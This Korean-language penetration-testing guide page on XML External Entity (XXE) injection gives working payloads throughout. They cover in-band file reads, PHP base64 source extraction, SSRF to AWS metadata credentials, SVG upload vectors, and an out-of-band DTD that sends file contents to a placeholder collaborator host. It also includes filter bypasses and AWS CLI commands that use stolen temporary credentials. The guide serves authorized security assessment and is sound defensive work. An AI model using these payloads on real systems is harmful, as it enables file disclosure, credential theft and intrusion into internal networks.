---
sidebar_position: 14
title: XXE
description: 웹 진단 - XML External Entity 진입점, In-band/Blind 판단, SVG 업로드, OOB 데이터 추출
keywords: [XXE, XML External Entity, Blind XXE, OOB, SVG, XML parser, OWASP A05]
draft: false
---

# XML 외부 엔티티 (XXE)

## 점검 목적

XML을 처리하는 엔드포인트가 DTD(Document Type Definition)와 외부 엔티티(External Entity)를 차단하지 않은 채 파싱하는지 확인한다. 성공 시 서버 로컬 파일 읽기, 내부망/metadata SSRF, 애플리케이션 설정·credential 노출로 이어질 수 있다.

## 유형 구분

| 유형 | 특징 | 실무 판단 |
| :--- | :--- | :--- |
| **In-band** | 엔티티 참조 결과가 응답 본문, 에러, 변환 결과물에 직접 노출 | `/etc/hostname`, `win.ini`처럼 영향이 낮은 파일로 먼저 확인 |
| **Blind / OOB** | 응답은 같지만 서버가 외부 DTD, DNS, HTTP 요청을 보냄 | Collaborator/interactsh에 DTD fetch와 exfil 요청이 오는지 확인 |
| **Error-based** | 파일 내용을 에러 메시지에 끼워 넣어 노출 | 모던 파서에서는 드묾. 상세 XML 에러가 노출될 때만 보조 확인 |
| **SSRF via XXE** | 외부 엔티티 URL이 서버 측 요청으로 처리됨 | `169.254.169.254`, 내부 HTTP 서비스 접근 여부 확인 |
| **XML Bomb / DoS** | 중첩 엔티티로 CPU/메모리 고갈 유발 | 운영 진단 기본 페이로드로 쓰지 않음. 방어 설정 확인용으로만 언급 |

---

## 진단 절차

### Step 1. 진입점 식별

XML 파서가 지나가는 기능을 먼저 찾는다. `Content-Type`과 파일 포맷이 가장 빠른 단서다.

- `application/xml`, `text/xml`
- `application/soap+xml` SOAP API
- `image/svg+xml` SVG 업로드, 아이콘, 프로필 이미지
- SAML Response, SSO 연동 XML
- RSS/Atom/OPML import, sitemap 제출
- DOCX/XLSX/PPTX/PDF 변환처럼 내부 XML을 후처리하는 업로드
- API가 JSON처럼 보여도 `Content-Type: application/xml`로 바꾸면 같은 라우트가 XML을 받는 경우

코드 검토가 가능하면 아래 함수를 우선 본다.

| 스택 | 위험 지점 |
| :--- | :--- |
| Java | `DocumentBuilderFactory`, `SAXParserFactory`, `SAXReader`, JAXB, dom4j |
| .NET | `XmlDocument`, `XmlReader`, `XDocument`, `DataSet.ReadXml()` |
| PHP | `simplexml_load_string()`, `DOMDocument::loadXML()`, `XMLReader` |
| Python | `xml.etree`, `lxml`, `minidom`, `sax` |
| Node.js | `libxmljs`, `xml2js`, `xmldom`, SOAP/XML middleware |

### Step 2. DOCTYPE 처리 여부 확인

정상 XML 요청을 baseline으로 저장한 뒤, 영향이 낮은 파일부터 확인한다.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<root><name>&xxe;</name></root>
```

Windows 후보는 아래처럼 본다.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<root><name>&xxe;</name></root>
```

응답에 파일 내용이 보이면 In-band XXE다. 응답이 같아도 XML 에러, status, length, 처리 시간, 후처리 파일 변화를 같이 비교한다.

### Step 3. 컨텍스트별 빠른 선택

| 입력 컨텍스트 | 먼저 넣을 값 | 볼 것 |
| :--- | :--- | :--- |
| XML API body | `file:///etc/hostname` 엔티티 | 응답 필드에 파일 내용이 섞이는지 |
| SOAP API | SOAP envelope 내부 값에 `&xxe;` | XML fault, SOAP response, 서버 로그 반영 |
| SVG 업로드 | SVG 내부 `text`에 `&xxe;` | 미리보기 이미지, 변환 PNG/PDF, OCR/메타데이터 |
| SAML/XML 서명 | 서명 검증 전 XML 파싱 여부 | DTD 허용 여부. 서명 우회와 섞어 판단하지 않기 |
| Office 업로드 | 내부 XML에 외부 엔티티 | 변환/미리보기/색인 과정에서 콜백 발생 |
| 응답 미노출 | 외부 DTD URL | Collaborator/interactsh DNS/HTTP 요청 |
| Cloud 후보 | IMDS URL 엔티티 | role name, instance document, credential JSON 노출 |

### Step 4. 관찰 결과별 판단

| 관찰 결과 | 바로 판단 | 다음 행동 |
| :--- | :--- | :--- |
| 응답에 hostname/passwd/win.ini 일부가 보임 | In-band XXE 확정 | 설정 파일, cloud metadata, 소스코드로 영향 확인 |
| 응답은 같고 Collaborator에 DTD fetch만 옴 | Blind XXE 후보 | 외부 DTD로 파일 exfil 또는 내부 URL fetch 확인 |
| DTD fetch와 `?d=` exfil 요청이 모두 옴 | Blind XXE 확정 | 어떤 파일/값이 나왔는지 최소 증거 저장 |
| `DOCTYPE is disallowed` 류 에러 | 방어 설정 가능성 높음 | 다른 XML parser 경로나 SVG/Office 후처리로 전환 |
| XML syntax error만 발생 | 단순 파싱 실패 가능성 | 정상 XML 구조에 맞춰 엔티티 위치 조정 |
| 외부 HTTP URL 결과가 응답에 보임 | SSRF via XXE 가능 | localhost/internal/metadata로 확장 |
| 업로드는 성공했지만 화면 변화 없음 | 후처리형 후보 | 썸네일, 변환 파일, 관리자 검수, 비동기 작업 시점 확인 |

### Step 5. 영향 확인

취약 확정 후에는 단순 `/etc/passwd`보다 실제 위험을 보여주는 값을 좁혀 확인한다.

- 로컬 파일: `/etc/hostname`, `/etc/passwd`, `/proc/self/environ`, `c:/windows/win.ini`
- 애플리케이션 설정: `.env`, `application.properties`, `application.yml`, `web.config`, `wp-config.php`
- PHP 소스코드: `php://filter/convert.base64-encode/resource=...`
- Cloud metadata: AWS/GCP/Azure instance metadata, role name, temporary credential
- 내부 서비스: localhost admin UI, Spring Actuator, Elasticsearch, Consul, Docker API

---

## 페이로드 노트

### 기본 In-band 파일 읽기

가장 먼저 서버가 외부 엔티티를 실제 값으로 치환하는지 본다.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

판정:

- `root:x:0:0:` 같은 문자열이 응답에 보이면 취약
- 파일 내용 일부만 보이면 XML 문자 제약, 출력 길이 제한, 필드 검증을 의심
- 500만 발생하면 에러 본문을 확인하고, 같은 구조에서 `/etc/hostname`으로 낮춰 재시도

### Windows 파일 확인

Windows/IIS/.NET 후보는 `win.ini`가 가볍다.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<root><name>&xxe;</name></root>
```

`[fonts]`, `[extensions]` 같은 문자열이 보이면 파일 읽기 가능으로 본다.

### PHP wrapper로 소스코드 추출

대상이 PHP이고 In-band XXE가 가능하면 일반 `.php` 파일은 실행되어 소스가 안 보일 수 있다. 이때 base64 wrapper로 읽는다.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root><name>&xxe;</name></root>
```

응답의 base64를 디코드해 DB 접속 정보, API key, JWT secret 같은 값이 있는지 본다.

```bash
echo "PD9waHAgLi4u" | base64 -d
```

### SSRF via XXE

외부 엔티티가 `http://` URL도 가져오면 XXE가 SSRF로 확장된다.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<root><name>&xxe;</name></root>
```

AWS IMDSv1 후보:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><name>&xxe;</name></root>
```

role name이 나오면 한 번 더 조회한다.

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>">
```

응답에 `AccessKeyId`, `SecretAccessKey`, `Token`이 보이면 Critical 영향이다. GCP/Azure metadata는 header가 필요한 경우가 많아, 단순 URL fetcher만으로는 token 조회가 막힐 수 있다.

### SVG 업로드 XXE

이미지 업로드에서 SVG가 허용되면 XML 파서를 거치는지 확인한다.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="120">
  <text x="20" y="60" font-size="18">&xxe;</text>
</svg>
```

볼 것:

- 업로드 직후 미리보기
- 서버가 변환한 PNG/JPG/PDF
- 다운로드된 원본/변환본의 텍스트·메타데이터
- 관리자 검수 화면이나 썸네일 생성 시점

텍스트가 이미지에 보이지 않아도 후처리 서버가 외부 DTD를 가져가는 Blind 케이스가 있다. SVG 파일명과 payload marker를 매번 바꿔 트리거 시점을 분리한다.

### Blind XXE - OOB DTD fetch

응답에 노출이 없으면 외부 DTD를 가져가도록 유도한다.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<COLLAB>.oastify.com/xxe.dtd">
  %xxe;
]>
<root><name>test</name></root>
```

Collaborator에 DNS/HTTP 요청이 오면 서버가 외부 엔티티를 해석한 것이다. 이 단계만으로는 파일 읽기까지 입증된 것은 아니므로, 가능하면 아래 exfil까지 확인한다.

### Blind XXE - OOB 데이터 추출

외부 서버에서 `xxe.dtd`를 제공한다.

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<COLLAB>.oastify.com/?d=%file;'>">
%eval;
%exfil;
```

판정:

- 첫 번째 요청: 대상 서버가 `xxe.dtd`를 가져감
- 두 번째 요청: `?d=<파일내용>` 형태로 데이터가 빠져나감
- DNS만 오고 HTTP가 없으면 egress 정책 또는 resolver 동작을 의심

파라미터 엔티티(`%`)를 다른 엔티티 정의에 쓰려면 외부 DTD 분리가 필요하다. 단일 XML 내부에 모두 넣으면 파서에서 거부되는 경우가 많다.

### Error-based XXE

상세 XML 에러가 응답에 노출될 때만 보조로 확인한다.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///not-found/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```

에러 메시지의 경로에 파일 내용이 섞이면 취약이다. 대부분의 현대 파서는 이 패턴을 막거나 에러를 축약하므로 우선순위는 낮다.

### Office / ZIP 기반 XML

DOCX/XLSX/PPTX는 내부 XML을 수정해 재압축해야 하므로 운영 점검에서는 SVG보다 느리다. 다만 문서 변환 서버, 미리보기, 색인 기능이 강하게 의심되면 확인한다.

```text
1. 파일 압축 해제
2. word/document.xml 또는 xl/sharedStrings.xml에 DOCTYPE 삽입
3. 원래 ZIP 구조로 재압축
4. 업로드 후 변환/미리보기/색인 트리거 확인
5. Collaborator hit 또는 변환 결과물 확인
```

### XML Bomb은 기본 사용하지 않기

Billion Laughs 같은 중첩 엔티티 payload는 서비스 가용성에 영향을 줄 수 있다. 실무 진단에서는 직접 실행보다 parser 설정에서 entity expansion limit, DTD 비활성화 여부를 확인하는 방식으로 다룬다.

---

## 필터 / 우회 매트릭스

| 필터 증상 | 우회 방향 | 예시 |
| :--- | :--- | :--- |
| `DOCTYPE` 문자열 차단 | 대소문자, 공백, XML 구조 위치 변경 | `<!DoCtYpE foo [...]>` |
| `SYSTEM` 차단 | `PUBLIC` identifier 확인 | `<!ENTITY xxe PUBLIC "id" "file:///etc/hostname">` |
| `file://` 차단 | HTTP 엔티티로 SSRF/OOB 확인 | `http://127.0.0.1:8080/` |
| 응답 본문 미노출 | Blind DTD fetch | `http://<COLLAB>/xxe.dtd` |
| 외부 HTTP 차단 | 로컬 파일만 확인 | `file:///etc/hostname` |
| 특정 파일 차단 | 더 낮은 영향 파일부터 | `/etc/hostname`, `c:/windows/win.ini` |
| XML 특수문자 때문에 출력 깨짐 | base64 wrapper, 짧은 파일 | `php://filter/convert.base64-encode/...` |
| SVG 텍스트 미표시 | 변환본/메타데이터/OOB 확인 | PNG/PDF 변환 결과, Collaborator |
| 첫 요청만 검증 | stored/async 후처리 확인 | 저장 후 미리보기, 관리자 검수, 배치 변환 |
| IMDS 응답 없음 | IMDSv2/header 필요성 분리 | SSRF 문서의 metadata 흐름 참고 |

---

## 취약 판정 기준

다음 중 하나라도 안정적으로 재현되면 취약으로 본다.

- [ ] 외부 엔티티 값이 응답에 치환되어 로컬 파일 내용이 노출됨
- [ ] SVG/Office/XML 업로드 후 변환 결과물에 파일 내용이 노출됨
- [ ] PHP wrapper 등으로 애플리케이션 소스코드 또는 설정 파일이 추출됨
- [ ] Collaborator/interactsh에 외부 DTD fetch와 데이터 exfil 요청이 수신됨
- [ ] XXE를 통해 localhost, 내부망, cloud metadata 응답이 노출됨
- [ ] XML 에러 메시지에 파일 내용 또는 내부 경로가 의미 있게 노출됨

다음은 후보 또는 보류로 둔다.

- [ ] 단순 500 응답만 발생하고 파일 내용, 콜백, 에러 상세가 없음
- [ ] `DOCTYPE is disallowed`처럼 DTD 차단 에러가 명확함
- [ ] 외부 DTD fetch만 가능하고 파일 읽기/내부 접근은 차단됨
- [ ] 클라이언트 브라우저에서만 외부 요청이 발생함
- [ ] 정상 XML validation 오류와 XXE payload 오류가 구분되지 않음

영향도가 올라가는 조건:

- [ ] cloud temporary credential을 획득하고 caller identity 확인 가능
- [ ] `.env`, `application.yml`, `web.config`, `wp-config.php` 등에서 secret 노출
- [ ] 내부 관리자/API/Actuator/metadata 응답이 In-band로 노출
- [ ] Stored/Async 업로드 경로에서 관리자 또는 백엔드 배치가 트리거
- [ ] XXE가 SSRF, LFI, credential reuse와 체인 가능

---

## 블라인드 모의해킹 확장

취약점 진단에서는 파일 한 개 또는 콜백 수신으로 멈추지만, 블라인드 모의해킹에서는 서버 위치에서 접근 가능한 내부 자산과 credential 사용 가능성까지 확인한다.

| 단계 | 확인할 것 | 증거 기준 |
| :--- | :--- | :--- |
| 1. 요청 주체 | source IP, User-Agent, DNS/HTTP 도달 여부 | Collaborator/interactsh 로그 |
| 2. 파서 위치 | 웹 서버 즉시 처리인지, 변환/배치/관리자 후처리인지 | 요청 시각, unique marker, 기능명 |
| 3. 파일 접근 | hostname, environ, 앱 설정 파일 | 원문 일부와 파일 경로 |
| 4. 내부 접근 | localhost, 사설 IP, metadata endpoint | 응답 샘플, status/length/time 차이 |
| 5. Credential 사용 | cloud role/token, DB/API key | caller identity, 제한된 list/read 권한 |
| 6. 체인 확장 | SSRF, LFI, deserialization, file upload 후처리 | 실제 접근 가능한 내부 기능 |

### OOB 인프라 확인

Blind XXE는 인프라 로그가 증거다. payload마다 marker를 바꿔 어느 기능이 요청을 보냈는지 분리한다.

```text
xxe-api-<RANDOM>.<COLLAB>.oastify.com
xxe-svg-<RANDOM>.<COLLAB>.oastify.com
xxe-docx-<RANDOM>.<COLLAB>.oastify.com
```

로그에서 아래 값을 남긴다.

```text
timestamp
source IP
DNS only / HTTP reached
HTTP method
User-Agent
requested path and query
```

### 파일 / 설정 추출 후보

파일 읽기가 가능하면 전체 파일 수집보다 credential 후보가 있는 경로를 좁힌다.

```text
file:///etc/hostname
file:///proc/self/environ
file:///app/.env
file:///var/www/html/.env
file:///var/www/html/config.php
file:///opt/app/application.properties
file:///opt/app/application.yml
file:///c:/inetpub/wwwroot/web.config
```

PHP는 소스코드가 실행되어 사라질 수 있으므로 `php://filter`를 우선 사용한다.

### 내부 / Metadata 접근 확인

XXE가 HTTP URL을 가져오면 SSRF처럼 내부 접근을 본다.

```text
http://127.0.0.1/
http://127.0.0.1:8080/actuator/env
http://127.0.0.1:9200/_cluster/health
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

credential이 나오면 별도 안전한 터미널에서 사용 가능성을 확인한다.

```bash
AWS_ACCESS_KEY_ID=<AccessKeyId> \
AWS_SECRET_ACCESS_KEY=<SecretAccessKey> \
AWS_SESSION_TOKEN=<Token> \
aws sts get-caller-identity
```

권한 확인은 읽기 중심으로 제한한다.

```bash
aws s3 ls
aws secretsmanager list-secrets --max-items 10
aws ssm describe-parameters --max-results 10
```

### 증거 정리

보고용 문장보다 재현 가능한 증거를 우선 남긴다.

- 취약 endpoint, method, Content-Type
- 정상 XML과 payload XML의 차이
- 응답 본문 또는 변환 결과물에서 확인한 값
- OOB 로그 원문: timestamp, source IP, path/query
- 추출한 파일 경로와 최소 원문 일부
- 내부/metadata 접근 시 status, length, 응답 샘플

---

## 참고자료

- [OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [OWASP Testing Guide - Testing for XML Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)
- [PortSwigger - XML external entity injection](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings - XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [HackTricks - XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- [defusedxml (Python)](https://github.com/tiran/defusedxml)
